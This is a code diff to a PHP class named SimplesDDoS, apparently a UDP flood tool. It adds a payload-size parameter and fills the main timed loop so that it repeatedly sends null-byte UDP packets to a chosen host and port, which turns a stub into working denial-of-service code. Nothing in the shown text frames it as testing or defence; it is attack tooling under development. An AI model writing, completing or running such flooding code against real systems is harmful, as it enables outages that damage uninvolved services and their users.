@@ -1,6 +1,6 @@
 <?php
 define('DEFAULT_BYTE',"\x00");
-
+define('MAX_PACKET_SIZE',	65000 );
 class SimplesDDoS {
   
   private $params = [
@@ -8,7 +8,8 @@ class SimplesDDoS {
     'port' => '',
     'packet' => '',
     'time' => '',
-    'execution_interval' => '1'
+    'execution_interval' => '1',
+    'bytes' => ''
   ];
 
   public function __construct($params = []) {
@@ -19,10 +20,13 @@ class SimplesDDoS {
     $packets_count = 0;
     $now_time = time();
     $max_execution_time = $now_time + $this->params['time'];
+    $message = str_repeat(DEFAULT_BYTE, $this->params['bytes']);
 
     while ($now_time < $max_execution_time) {
-      
+      $this->generate_udp_connection($this->params['host'],$this->params['port'], $message);
+      $now_time = time();
       $packets_count++;
+      usleep($this->params['execution_interval'] * 100);
     }
   }
 
